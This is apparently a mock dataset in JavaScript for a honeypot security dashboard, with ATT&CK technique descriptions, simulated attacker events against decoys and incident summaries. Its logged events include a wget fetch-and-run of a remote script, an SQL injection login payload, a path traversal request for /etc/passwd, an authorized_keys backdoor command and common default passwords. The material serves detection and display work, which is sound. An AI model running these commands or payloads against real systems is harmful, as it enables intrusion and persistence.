// Demo dataset for the LXS dashboard. Shapes match packages/schema/src/api.ts.
// Read-only: lib/core.js uses it during an API outage, and only under LXS_ALLOW_MOCK=1.
// There are deliberately no mutations here. A mock block would report success for nothing.

const NOW = Date.now();
const iso = (secAgo) => new Date(NOW - secAgo * 1000).toISOString();
const clone = (v) =>
  typeof structuredClone === "function" ? structuredClone(v) : JSON.parse(JSON.stringify(v));

export const PROJECT_ID = "prj_acme_shop";
export const PROJECT_NAME = "Acme Shop";

/* ───────────────────────── ATT&CK catalogue ───────────────────────── */
export const TACTICS = [
  "Reconnaissance",
  "Initial Access",
  "Execution",
  "Persistence",
  "Defense Evasion",
  "Credential Access",
  "Discovery",
  "Collection",
  "Command and Control",
  "Exfiltration",
];

export const TECHNIQUES = {
  T1595: {
    name: "Active Scanning",
    tactic: "Reconnaissance",
    desc: "Probing infrastructure with network traffic to gather information before an attack.",
    count: 41,
  },
  "T1595.002": {
    name: "Vulnerability Scanning",
    tactic: "Reconnaissance",
    desc: "Scanning for known-vulnerable software versions, often with tools such as sqlmap or nikto.",
    count: 27,
  },
  "T1595.003": {
    name: "Wordlist Scanning",
    tactic: "Reconnaissance",
    desc: "Iterating through wordlists of paths (/admin, /.env, /backup.sql) to discover hidden content.",
    count: 33,
  },
  T1190: {
    name: "Exploit Public-Facing Application",
    tactic: "Initial Access",
    desc: "Exploiting a weakness in an Internet-facing system, such as SQL injection or path traversal.",
    count: 9,
  },
  T1078: {
    name: "Valid Accounts",
    tactic: "Initial Access",
    desc: "Using legitimate credentials, here leaked or stolen ones, to access a system.",
    count: 5,
  },
  "T1078.001": {
    name: "Default Accounts",
    tactic: "Initial Access",
    desc: "Logging in with vendor-default or trivially weak credentials such as admin/admin.",
    count: 14,
  },
  "T1059.004": {
    name: "Unix Shell",
    tactic: "Execution",
    desc: "Running commands through an interactive Unix shell session.",
    count: 11,
  },
  "T1053.003": {
    name: "Cron",
    tactic: "Persistence",
    desc: "Scheduling recurring execution through cron to keep a foothold.",
    count: 2,
  },
  "T1098.004": {
    name: "SSH Authorized Keys",
    tactic: "Persistence",
    desc: "Adding an attacker key to authorized_keys to keep SSH access.",
    count: 2,
  },
  "T1070.003": {
    name: "Clear Command History",
    tactic: "Defense Evasion",
    desc: "Wiping shell history (history -c, unset HISTFILE) to hide commands.",
    count: 1,
  },
  "T1110.001": {
    name: "Password Guessing",
    tactic: "Credential Access",
    desc: "Guessing passwords against a login, typically with a short common-password list.",
    count: 19,
  },
  "T1552.001": {
    name: "Credentials In Files",
    tactic: "Credential Access",
    desc: "Searching files for stored secrets such as API keys and passwords.",
    count: 6,
  },
  T1046: {
    name: "Network Service Discovery",
    tactic: "Discovery",
    desc: "Enumerating open ports and services on remote hosts.",
    count: 4,
  },
  T1083: {
    name: "File and Directory Discovery",
    tactic: "Discovery",
    desc: "Listing files and directories to find data of interest (ls, find).",
    count: 10,
  },
  T1082: {
    name: "System Information Discovery",
    tactic: "Discovery",
    desc: "Collecting OS and hardware details (uname -a, /etc/os-release).",
    count: 9,
  },
  T1033: {
    name: "System Owner/User Discovery",
    tactic: "Discovery",
    desc: "Finding out who is logged in and as which user (whoami, id).",
    count: 5,
  },
  T1057: {
    name: "Process Discovery",
    tactic: "Discovery",
    desc: "Listing running processes (ps).",
    count: 3,
  },
  "T1087.001": {
    name: "Local Account Discovery",
    tactic: "Discovery",
    desc: "Reading local account lists (cat /etc/passwd).",
    count: 2,
  },
  T1005: {
    name: "Data from Local System",
    tactic: "Collection",
    desc: "Reading files from the compromised host, here the bait customer export.",
    count: 8,
  },
  T1105: {
    name: "Ingress Tool Transfer",
    tactic: "Command and Control",
    desc: "Downloading tools or payloads onto the host with wget, curl or tftp.",
    count: 3,
  },
  T1090: {
    name: "Proxy",
    tactic: "Command and Control",
    desc: "Using the host as a relay, for example via SSH port-forwarding.",
    count: 1,
  },
  T1041: {
    name: "Exfiltration Over C2 Channel",
    tactic: "Exfiltration",
    desc: "Moving stolen data out over the same channel the attacker controls the host with.",
    count: 4,
  },
};

const tech = (id, confidence = 0.8) => ({
  id,
  name: TECHNIQUES[id].name,
  tactic: TECHNIQUES[id].tactic,
  confidence,
});
const D = (rule_id, points, reason, techIds, stage, floor, evidence_event_ids) => ({
  rule_id,
  points,
  reason,
  techniques: techIds.map(([id, c]) => tech(id, c)),
  stage,
  floor,
  evidence_event_ids,
});

/* ───────────────────────── Events ───────────────────────── */
const events = [];
const evtAdd = (inc, base, id, off, type, o = {}) => {
  const decoyId = o.decoy === undefined ? null : o.decoy;
  const real = o.real === true;
  events.push({
    id,
    event_uid: `01J${id.replace(/\W/g, "").toUpperCase().padEnd(23, "0").slice(0, 23)}`,
    event_type: type,
    is_decoy: !real,
    src_ip: o.ip,
    src_port: o.port ?? 40000 + ((id.length * 977 + off * 13) % 20000),
    dst_service: o.svc,
    decoy_id: decoyId,
    session_id: o.sess ?? null,
    outcome: o.outcome ?? null,
    occurred_at: iso(base - off),
    received_at: iso(base - off - 0.4),
    fields: o.f || {},
    count: o.count || 1,
    simulated: o.sim ?? false,
    incident_id: inc,
    stage: o.stage ?? null,
    techniques: o.tech || [],
    tags: o.tags || [],
  });
};

/* #7 — the PS use case (SSH decoy -> brute force -> admin/admin -> ... -> real /api/payments -> honeytoken) */
{
  const I = "inc_07",
    B = 840,
    ip = "203.0.113.66",
    S = "sess_7a91";
  const ua = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0";
  evtAdd(I, B, "ev_07_01", 0, "http.request", {
    ip,
    svc: "http:/admin",
    decoy: "web-admin",
    f: { method: "GET", url: "/admin", status_code: 302, user_agent: ua },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_07_02", 3, "http.request", {
    ip,
    svc: "http:/.env",
    decoy: "web-bait",
    f: {
      method: "GET",
      url: "/.env",
      status_code: 200,
      user_agent: ua,
      note: "bait served: SSH_HOST=db-backup-01",
    },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_07_03", 6, "http.request", {
    ip,
    svc: "http:/backup.sql",
    decoy: "web-bait",
    f: { method: "GET", url: "/backup.sql", status_code: 200, user_agent: ua },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_07_04", 38, "connection.open", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { client_banner: "SSH-2.0-OpenSSH_9.6" },
  });
  const fails = [
    ["root", "123456"],
    ["root", "password"],
    ["admin", "admin123"],
    ["ubuntu", "ubuntu"],
    ["test", "test1234"],
  ];
  fails.forEach(([u, p], i) =>
    evtAdd(I, B, `ev_07_0${5 + i}`, 41 + i * 2.5, "auth.attempt", {
      ip,
      svc: "ssh:22",
      decoy: "ssh-db-backup-01",
      sess: S,
      outcome: "failure",
      f: { username: u, password_masked: `${p[0]}***${p.slice(-1)}` },
      stage: "initial_access",
      tech: ["T1110.001"],
    }),
  );
  evtAdd(I, B, "ev_07_10", 54, "auth.attempt", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    outcome: "success",
    f: {
      username: "admin",
      password_masked: "a***n",
      password_clear: "admin",
      common_credential: true,
    },
    stage: "initial_access",
    tech: ["T1078.001"],
    tags: ["trigger:R06"],
  });
  evtAdd(I, B, "ev_07_11", 67, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "ls -la /srv" },
    stage: "discovery",
    tech: ["T1083", "T1059.004"],
  });
  evtAdd(I, B, "ev_07_12", 81, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "uname -a" },
    stage: "discovery",
    tech: ["T1082"],
  });
  evtAdd(I, B, "ev_07_13", 96, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "cd /srv/exports && ls" },
    stage: "discovery",
    tech: ["T1083"],
  });
  evtAdd(I, B, "ev_07_14", 112, "file.download", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: {
      command: "cat /srv/exports/customer_data.csv",
      file_name: "customer_data.csv",
      file_size: 48213,
      canary_rows: 3,
    },
    stage: "collection",
    tech: ["T1005"],
    tags: ["decoy_data"],
  });
  evtAdd(I, B, "ev_07_15", 128, "honeytoken.read", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "cat ~/.config/acme.json", file_name: "acme.json", token: "acme_live_…3f" },
    stage: "collection",
    tech: ["T1552.001"],
    tags: ["honeytoken"],
  });
  evtAdd(I, B, "ev_07_16", 196, "asset.access", {
    ip,
    svc: "app:/api/payments",
    real: true,
    outcome: "success",
    f: {
      method: "GET",
      url: "/api/payments",
      status_code: 200,
      asset: "Payments API",
      critical: true,
      watched_source: true,
    },
    stage: null,
    tech: ["T1078"],
    tags: ["real_asset", "critical_asset", "trigger:R15"],
  });
  evtAdd(I, B, "ev_07_17", 211, "honeytoken.use", {
    ip,
    svc: "app:/api/customers",
    real: true,
    outcome: "success",
    f: {
      method: "GET",
      url: "/api/customers",
      status_code: 200,
      authorization: "Bearer acme_live_…3f",
      token: "acme_live_…3f",
    },
    stage: "exfiltration",
    tech: ["T1552.001", "T1041"],
    tags: ["honeytoken", "trigger:R16"],
  });
}

/* #6 — opportunistic bot with common creds + wget */
{
  const I = "inc_06",
    B = 2460,
    ip = "198.51.100.23",
    S = "sess_c0de";
  evtAdd(I, B, "ev_06_01", 0, "connection.open", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { client_banner: "SSH-2.0-Go" },
  });
  [
    ["root", "root"],
    ["root", "123456"],
    ["pi", "raspberry"],
    ["admin", "1234"],
    ["root", "toor"],
  ].forEach(([u, p], i) =>
    evtAdd(I, B, `ev_06_0${2 + i}`, 1 + i * 0.9, "auth.attempt", {
      ip,
      svc: "ssh:22",
      decoy: "ssh-db-backup-01",
      sess: S,
      outcome: "failure",
      f: { username: u, password_masked: `${p[0]}***${p.slice(-1)}` },
      stage: "initial_access",
      tech: ["T1110.001"],
    }),
  );
  evtAdd(I, B, "ev_06_07", 7, "auth.attempt", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    outcome: "success",
    f: {
      username: "root",
      password_masked: "a***3",
      password_clear: "admin123",
      common_credential: true,
    },
    stage: "initial_access",
    tech: ["T1078.001"],
  });
  evtAdd(I, B, "ev_06_08", 8.5, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "uname -s -v -n -r -m" },
    stage: "discovery",
    tech: ["T1082"],
  });
  evtAdd(I, B, "ev_06_09", 9.1, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "cd /tmp || cd /var/run; wget http://45.9.148.21/x.sh -O .x; chmod +x .x; ./.x" },
    stage: "execution",
    tech: ["T1105", "T1059.004"],
  });
  evtAdd(I, B, "ev_06_10", 9.8, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "rm -rf .x" },
    stage: "execution",
    tech: ["T1059.004"],
  });
}

/* #5 — web-admin credential stuffing + injection */
{
  const I = "inc_05",
    B = 10800,
    ip = "192.0.2.88";
  const ua = "sqlmap/1.7.11#stable (https://sqlmap.org)";
  evtAdd(I, B, "ev_05_01", 0, "http.request", {
    ip,
    svc: "http:/admin",
    decoy: "web-admin",
    f: { method: "GET", url: "/admin", status_code: 302, user_agent: ua },
    stage: "recon",
    tech: ["T1595.002"],
  });
  evtAdd(I, B, "ev_05_02", 4, "http.request", {
    ip,
    svc: "http:/wp-login.php",
    decoy: "web-bait",
    f: { method: "GET", url: "/wp-login.php", status_code: 200, user_agent: ua },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_05_03", 9, "http.request", {
    ip,
    svc: "http:/admin/login",
    decoy: "web-admin",
    outcome: "failure",
    count: 6,
    f: {
      method: "POST",
      url: "/admin/login",
      status_code: 401,
      user_agent: ua,
      payload: "username=admin' OR '1'='1'--&password=x",
    },
    stage: "initial_access",
    tech: ["T1190", "T1110.001"],
    tags: ["sqli"],
  });
  evtAdd(I, B, "ev_05_04", 15, "http.request", {
    ip,
    svc: "http:/admin",
    decoy: "web-admin",
    f: { method: "GET", url: "/admin/../../../etc/passwd", status_code: 400, user_agent: ua },
    stage: "initial_access",
    tech: ["T1190"],
    tags: ["traversal"],
  });
  evtAdd(I, B, "ev_05_05", 760, "http.request", {
    ip,
    svc: "http:/admin",
    decoy: "web-admin",
    f: { method: "GET", url: "/admin", status_code: 302, user_agent: ua },
    stage: "recon",
    tech: ["T1595.002"],
    tags: ["revisit"],
  });
}

/* #4 / #3 — noise scanners */
{
  const I = "inc_04",
    B = 3300,
    ip = "45.155.205.233",
    ua = "Mozilla/5.0 zgrab/0.x";
  ["/wp-login.php", "/xmlrpc.php", "/.git/config", "/phpmyadmin/", "/server-status"].forEach(
    (u, i) =>
      evtAdd(I, B, `ev_04_0${i + 1}`, i * 3, "http.request", {
        ip,
        svc: `http:${u}`,
        decoy: "web-bait",
        f: { method: "GET", url: u, status_code: 404, user_agent: ua },
        stage: "recon",
        tech: ["T1595.003"],
      }),
  );
  evtAdd(I, B, "ev_04_06", 18, "auth.attempt", {
    ip,
    svc: "http:/wp-login.php",
    decoy: "web-bait",
    outcome: "failure",
    count: 6,
    f: {
      method: "POST",
      url: "/wp-login.php",
      username: "admin",
      password_masked: "p***d",
      user_agent: ua,
    },
    stage: "initial_access",
    tech: ["T1110.001"],
  });
}
{
  const I = "inc_03",
    B = 7500,
    ip = "45.155.205.233";
  evtAdd(I, B, "ev_03_01", 0, "connection.open", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: "sess_5c4a",
    f: { client_banner: "SSH-2.0-libssh_0.9.6" },
    stage: "recon",
    tech: ["T1595"],
  });
  evtAdd(I, B, "ev_03_02", 1, "connection.close", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: "sess_5c4a",
    f: { reason: "client closed before auth" },
  });
}

/* #2 — targeted, leaked deploy password */
{
  const I = "inc_02",
    B = 18000,
    ip = "91.240.118.7",
    S = "sess_91b2";
  const ua = "curl/8.5.0";
  evtAdd(I, B, "ev_02_01", 0, "http.request", {
    ip,
    svc: "http:/.env",
    decoy: "web-bait",
    f: { method: "GET", url: "/.env", status_code: 200, user_agent: ua, note: "bait served" },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_02_02", 7, "http.request", {
    ip,
    svc: "http:/backup.sql",
    decoy: "web-bait",
    f: { method: "GET", url: "/backup.sql", status_code: 200, user_agent: ua },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_02_03", 95, "auth.attempt", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    outcome: "success",
    f: {
      username: "deploy",
      password_masked: "S***4",
      common_credential: false,
      note: "credential leaked via /.env bait",
    },
    stage: "initial_access",
    tech: ["T1078"],
    tags: ["leaked_credential"],
  });
  evtAdd(I, B, "ev_02_04", 130, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "id" },
    stage: "discovery",
    tech: ["T1033"],
  });
  evtAdd(I, B, "ev_02_05", 151, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: "ls -la ~" },
    stage: "discovery",
    tech: ["T1083"],
  });
  evtAdd(I, B, "ev_02_06", 188, "command.exec", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: { command: 'echo "ssh-ed25519 AAAAC3Nza… op@kali" >> ~/.ssh/authorized_keys' },
    stage: "execution",
    tech: ["T1098.004"],
  });
  evtAdd(I, B, "ev_02_07", 230, "file.download", {
    ip,
    svc: "ssh:22",
    decoy: "ssh-db-backup-01",
    sess: S,
    f: {
      command: "cat /srv/exports/customer_data.csv",
      file_name: "customer_data.csv",
      file_size: 48213,
    },
    stage: "collection",
    tech: ["T1005"],
    tags: ["decoy_data"],
  });
}

/* #1 — earlier critical, resolved: honeytoken used */
{
  const I = "inc_01",
    B = 172800,
    ip = "91.240.118.7",
    _S = "sess_f00d";
  evtAdd(I, B, "ev_01_01", 0, "http.request", {
    ip,
    svc: "http:/admin",
    decoy: "web-admin",
    f: { method: "GET", url: "/admin", status_code: 302 },
    stage: "recon",
    tech: ["T1595.003"],
  });
  evtAdd(I, B, "ev_01_03", 60, "file.download", {
    ip,
    svc: "http:/admin/export",
    decoy: "web-admin",
    f: {
      method: "GET",
      url: "/admin/export?format=csv",
      file_name: "customers.csv",
      file_size: 48213,
    },
    stage: "collection",
    tech: ["T1005"],
    tags: ["decoy_data"],
  });
  evtAdd(I, B, "ev_01_04", 380, "honeytoken.use", {
    ip,
    svc: "app:/api/customers",
    real: true,
    outcome: "success",
    f: {
      method: "GET",
      url: "/api/customers",
      status_code: 200,
      authorization: "Bearer acme_live_…b1",
      token: "acme_live_…b1",
    },
    stage: "exfiltration",
    tech: ["T1552.001", "T1041"],
    tags: ["honeytoken", "trigger:R16"],
  });
}

/* Unattached background events (below incident threshold) */
[
  [
    120,
    "66.249.66.1",
    "http:/robots.txt",
    "web-bait",
    { method: "GET", url: "/robots.txt", status_code: 200, user_agent: "Googlebot/2.1" },
  ],
  [
    310,
    "34.140.22.9",
    "http:/",
    "web-admin",
    { method: "GET", url: "/", status_code: 200, user_agent: "python-requests/2.31" },
  ],
  [
    560,
    "185.191.171.4",
    "http:/favicon.ico",
    "web-bait",
    {
      method: "GET",
      url: "/favicon.ico",
      status_code: 404,
      user_agent: "Mozilla/5.0 (compatible; SemrushBot)",
    },
  ],
  [
    905,
    "94.102.61.8",
    "http:/admin",
    "web-admin",
    { method: "HEAD", url: "/admin", status_code: 302, user_agent: "Go-http-client/1.1" },
  ],
  [
    1320,
    "5.188.206.14",
    "http:/.git/config",
    "web-bait",
    { method: "GET", url: "/.git/config", status_code: 404, user_agent: "Mozilla/5.0 zgrab/0.x" },
  ],
  [
    1810,
    "198.235.24.60",
    "http:/",
    "web-admin",
    {
      method: "GET",
      url: "/",
      status_code: 200,
      user_agent: "Expanse, a Palo Alto Networks company",
    },
  ],
  [
    2200,
    "167.94.138.44",
    "http:/",
    "web-bait",
    {
      method: "GET",
      url: "/",
      status_code: 200,
      user_agent: "Mozilla/5.0 (compatible; CensysInspect/1.1)",
    },
  ],
  [
    4100,
    "71.6.135.131",
    "http:/admin",
    "web-admin",
    { method: "GET", url: "/admin", status_code: 302, user_agent: "curl/7.88.1" },
  ],
].forEach(([off, ip, svc, decoy, f], i) =>
  evtAdd(null, off, `ev_bg_${String(i + 1).padStart(2, "0")}`, 0, "http.request", {
    ip,
    svc,
    decoy,
    f,
    stage: "recon",
    tech: ["T1595"],
  }),
);
// A couple of sensor-side redis probes + an asset.blocked
evtAdd(null, 1500, "ev_bg_09", 0, "db.command", {
  ip: "141.98.11.20",
  svc: "redis:6379",
  decoy: "redis-cache-01",
  f: { command: "INFO" },
  stage: "discovery",
  tech: ["T1046"],
});
evtAdd(null, 1495, "ev_bg_10", 0, "db.command", {
  ip: "141.98.11.20",
  svc: "redis:6379",
  decoy: "redis-cache-01",
  f: { command: "KEYS *" },
  stage: "discovery",
  tech: ["T1046"],
});
evtAdd(null, 700, "ev_bg_11", 0, "asset.blocked", {
  ip: "185.220.101.4",
  svc: "app:/api/payments",
  real: true,
  outcome: "failure",
  f: { method: "POST", url: "/api/payments", status_code: 403, reason: "source on blocklist" },
  stage: null,
  tags: ["blocked"],
});

events.sort((a, b) => new Date(b.occurred_at) - new Date(a.occurred_at));

/* ───────────────────────── Incidents ───────────────────────── */
const AI_7 = {
  headline: "Human-paced attacker pivoted from the SSH decoy to the real Payments API",
  what_happened:
    "From 203.0.113.66 the attacker probed /admin, /.env and /backup.sql on the web decoys, failed five SSH logins, then got into the db-backup-01 decoy with the default credential admin / admin. Typing at human pace, they listed /srv, ran uname -a, read the bait customer_data.csv and the honeytoken file ~/.config/acme.json. About two minutes later the same IP called the real /api/payments and then used the honeytoken API key acme_live_…3f against /api/customers.",
  why_it_matters:
    "A honeytoken has no legitimate use, so this is not a scanner. The source followed the breadcrumbs we planted in the decoy and reached a production asset you declared critical, which makes this a targeted intrusion with real exposure.",
  recommended_actions: [
    "Block 203.0.113.66 for 24 h (one click below).",
    "Review Payments API and Customers API access logs for the last 15 minutes.",
    "Rotate the credentials stored on db-backup-01 and revoke the leaked acme_live_…3f key.",
    "Export IOCs (JSON/STIX) and hand them to your firewall or SIEM.",
  ],
  is_fallback: false,
};

const incidentDefs = [
  {
    id: "inc_07",
    number: 7,
    title: "SSH decoy login chained into real Payments API access",
    status: "open",
    label: "targeted",
    severity: "critical",
    score: 100,
    src_ip: "203.0.113.66",
    attacker_id: "att_1",
    real_asset_reached: true,
    honeytoken_used: true,
    ai_status: "ready",
    stages: ["recon", "initial_access", "execution", "discovery", "collection", "exfiltration"],
    ai_summary: AI_7,
    detections: [
      D("R01", 5, "Touched a decoy: GET /admin on web-admin", [["T1595", 0.7]], "recon", null, [
        "ev_07_01",
      ]),
      D(
        "R02",
        5,
        "Swept 3 decoy paths in 6 s (/admin, /.env, /backup.sql)",
        [["T1595.003", 0.8]],
        "recon",
        null,
        ["ev_07_01", "ev_07_02", "ev_07_03"],
      ),
      D(
        "R04",
        10,
        "5 failed SSH logins in 12 s (root, root, admin, ubuntu, test)",
        [["T1110.001", 0.9]],
        "initial_access",
        null,
        ["ev_07_05", "ev_07_06", "ev_07_07", "ev_07_08", "ev_07_09"],
      ),
      D(
        "R06",
        25,
        "Logged in to ssh-db-backup-01 as admin with default credential admin/admin",
        [["T1078.001", 0.9]],
        "initial_access",
        null,
        ["ev_07_10"],
      ),
      D(
        "R07",
        5,
        "Interactive session: 3 commands in 29 s",
        [["T1059.004", 0.9]],
        "execution",
        null,
        ["ev_07_11", "ev_07_12", "ev_07_13"],
      ),
      D(
        "R13",
        0,
        "Human cadence: 4 actions, median gap 15 s, variable gaps (label signal, forces Targeted)",
        [],
        null,
        null,
        ["ev_07_11", "ev_07_12", "ev_07_13", "ev_07_14"],
      ),
      D(
        "R08",
        10,
        "Discovery commands: ls -la /srv, uname -a",
        [
          ["T1083", 0.8],
          ["T1082", 0.8],
        ],
        "discovery",
        null,
        ["ev_07_11", "ev_07_12"],
      ),
      D(
        "R11",
        10,
        "Read decoy data: /srv/exports/customer_data.csv (3 canary rows)",
        [["T1005", 0.8]],
        "collection",
        null,
        ["ev_07_14"],
      ),
      D(
        "R18",
        0,
        "Bait file contents left the decoy (tag only, no points)",
        [["T1041", 0.6]],
        "exfiltration",
        null,
        ["ev_07_14"],
      ),
      D(
        "R15",
        50,
        "Watched, targeted source called the real Payments API (declared critical): +40 targeted, +10 critical asset. Floor CRITICAL.",
        [["T1078", 0.6]],
        null,
        "critical",
        ["ev_07_16"],
      ),
      D(
        "R16",
        50,
        "Honeytoken acme_live_…3f from ~/.config/acme.json used against /api/customers. Floor CRITICAL, label forced Targeted.",
        [
          ["T1552.001", 0.95],
          ["T1078", 0.95],
        ],
        "exfiltration",
        "critical",
        ["ev_07_17"],
      ),
    ],
  },
  {
    id: "inc_06",
    number: 6,
    title: "Scripted SSH bot logged in with common creds and tried to pull a payload",
    status: "open",
    label: "opportunistic",
    severity: "high",
    score: 65,
    src_ip: "198.51.100.23",
    attacker_id: "att_2",
    real_asset_reached: false,
    honeytoken_used: false,
    ai_status: "ready",
    stages: ["recon", "initial_access", "execution", "discovery"],
    ai_summary: {
      headline: "Automated SSH bot got in with root/admin123 and tried to download a payload",
      what_happened:
        "A script with Go client banner tried six passwords in ~7 s, logged in as root, ran uname, then attempted wget http://45.9.148.21/x.sh. The download is blocked by the decoy containment policy so nothing executed.",
      why_it_matters:
        "Common-credential bot activity: noisy and automated, no real asset reached. Still worth blocking the payload host at your egress firewall.",
      recommended_actions: [
        "Add 45.9.148.21 to your egress blocklist.",
        "Check real SSH hosts for the same weak credential.",
        "Batch-resolve after review.",
      ],
      is_fallback: false,
    },
    detections: [
      D(
        "R01",
        5,
        "Touched a decoy: SSH connection to ssh-db-backup-01",
        [["T1595", 0.7]],
        "recon",
        null,
        ["ev_06_01"],
      ),
      D("R04", 10, "5 failed SSH logins in 4 s", [["T1110.001", 0.9]], "initial_access", null, [
        "ev_06_02",
        "ev_06_03",
        "ev_06_04",
        "ev_06_05",
        "ev_06_06",
      ]),
      D(
        "R06",
        25,
        "Logged in as root with common credential (in bundled wordlist)",
        [["T1078.001", 0.9]],
        "initial_access",
        null,
        ["ev_06_07"],
      ),
      D(
        "R07",
        5,
        "Interactive session: 3 commands in 1.3 s (bot cadence)",
        [["T1059.004", 0.9]],
        "execution",
        null,
        ["ev_06_08", "ev_06_09", "ev_06_10"],
      ),
      D("R08", 5, "Discovery command: uname -s -v -n -r -m", [["T1082", 0.8]], "discovery", null, [
        "ev_06_08",
      ]),
      D(
        "R09",
        15,
        "Tool transfer attempt: wget http://45.9.148.21/x.sh (blocked by containment)",
        [["T1105", 0.8]],
        "execution",
        null,
        ["ev_06_09"],
      ),
    ],
  },
  {
    id: "inc_05",
    number: 5,
    title: "Scanner with SQLi and traversal payloads against the admin decoy",
    status: "acknowledged",
    label: "opportunistic",
    severity: "medium",
    score: 48,
    src_ip: "192.0.2.88",
    attacker_id: "att_4",
    real_asset_reached: false,
    honeytoken_used: false,
    ai_status: "fallback",
    stages: ["recon", "initial_access"],
    ai_summary: {
      headline: "sqlmap-style scanner tried SQL injection and path traversal on /admin",
      what_happened:
        "Source 192.0.2.88 identified itself as sqlmap, attempted six injected logins on /admin/login and one traversal request, then returned 12 minutes later.",
      why_it_matters:
        "Automated exploit probing against the decoy, no login success and no real-asset contact.",
      recommended_actions: [
        "Review WAF rules for the same payloads on the real /admin.",
        "Resolve if nothing else shows up.",
      ],
      is_fallback: true,
    },
    detections: [
      D("R01", 5, "Touched a decoy: GET /admin", [["T1595", 0.7]], "recon", null, ["ev_05_01"]),
      D("R02", 5, "Swept 2 decoys in 9 s", [["T1595.003", 0.8]], "recon", null, [
        "ev_05_01",
        "ev_05_02",
      ]),
      D("R03", 3, "Known scanner user-agent: sqlmap/1.7.11", [["T1595.002", 0.8]], "recon", null, [
        "ev_05_01",
      ]),
      D(
        "R04",
        10,
        "6 failed logins in 6 s on /admin/login",
        [["T1110.001", 0.9]],
        "initial_access",
        null,
        ["ev_05_03"],
      ),
      D(
        "R05",
        20,
        "Injection signatures: SQLi (+10) and path traversal (+10)",
        [["T1190", 0.7]],
        "initial_access",
        null,
        ["ev_05_03", "ev_05_04"],
      ),
      D("R14", 5, "Revisited after 12 min idle", [], null, null, ["ev_05_05"]),
    ],
  },
  {
    id: "inc_04",
    number: 4,
    title: "Mass-scanner sweep of WordPress and git paths",
    status: "open",
    label: "noise",
    severity: "low",
    score: 23,
    src_ip: "45.155.205.233",
    attacker_id: "att_5",
    real_asset_reached: false,
    honeytoken_used: false,
    ai_status: "fallback",
    stages: ["recon", "initial_access"],
    ai_summary: {
      headline: "Internet-wide scanner probing common CMS paths",
      what_happened:
        "Five well-known paths (wp-login.php, xmlrpc.php, .git/config, phpmyadmin, server-status) were requested within 15 s using zgrab, followed by six failed WordPress logins.",
      why_it_matters: "Classic background noise. No successful authentication, never notifies.",
      recommended_actions: ["No action needed. Auto-suppressed."],
      is_fallback: true,
    },
    detections: [
      D("R01", 5, "Touched a decoy: /wp-login.php", [["T1595", 0.7]], "recon", null, ["ev_04_01"]),
      D("R02", 5, "Swept 5 decoy paths in 12 s", [["T1595.003", 0.8]], "recon", null, [
        "ev_04_01",
        "ev_04_02",
        "ev_04_03",
        "ev_04_04",
        "ev_04_05",
      ]),
      D("R03", 3, "Known scanner user-agent: zgrab", [["T1595.002", 0.8]], "recon", null, [
        "ev_04_01",
      ]),
      D(
        "R04",
        10,
        "6 failed logins on /wp-login.php",
        [["T1110.001", 0.9]],
        "initial_access",
        null,
        ["ev_04_06"],
      ),
    ],
  },
  {
    id: "inc_03",
    number: 3,
    title: "libssh banner grab on the SSH decoy",
    status: "resolved",
    label: "noise",
    severity: "low",
    score: 8,
    src_ip: "45.155.205.233",
    attacker_id: "att_5",
    real_asset_reached: false,
    honeytoken_used: false,
    ai_status: "fallback",
    stages: ["recon"],
    ai_summary: {
      headline: "Banner grab, disconnected before authentication",
      what_happened: "A libssh client connected and closed within one second.",
      why_it_matters: "Scanner behaviour only.",
      recommended_actions: ["None."],
      is_fallback: true,
    },
    detections: [
      D("R01", 5, "Touched a decoy: SSH connection", [["T1595", 0.7]], "recon", null, ["ev_03_01"]),
      D("R03", 3, "Known scanner SSH banner: libssh_0.9.6", [["T1595.002", 0.8]], "recon", null, [
        "ev_03_01",
      ]),
    ],
  },
  {
    id: "inc_02",
    number: 2,
    title: "Leaked deploy password reused on SSH decoy, persistence attempted",
    status: "acknowledged",
    label: "targeted",
    severity: "high",
    score: 80,
    src_ip: "91.240.118.7",
    attacker_id: "att_3",
    real_asset_reached: false,
    honeytoken_used: false,
    ai_status: "ready",
    stages: ["recon", "initial_access", "execution", "discovery", "collection"],
    ai_summary: {
      headline: "Returning attacker used the password leaked in /.env and planted an SSH key",
      what_happened:
        "After fetching the bait /.env and /backup.sql, 91.240.118.7 logged in to db-backup-01 as deploy with a password that is not in any common list, ran id and ls, appended their own key to authorized_keys, and read customer_data.csv.",
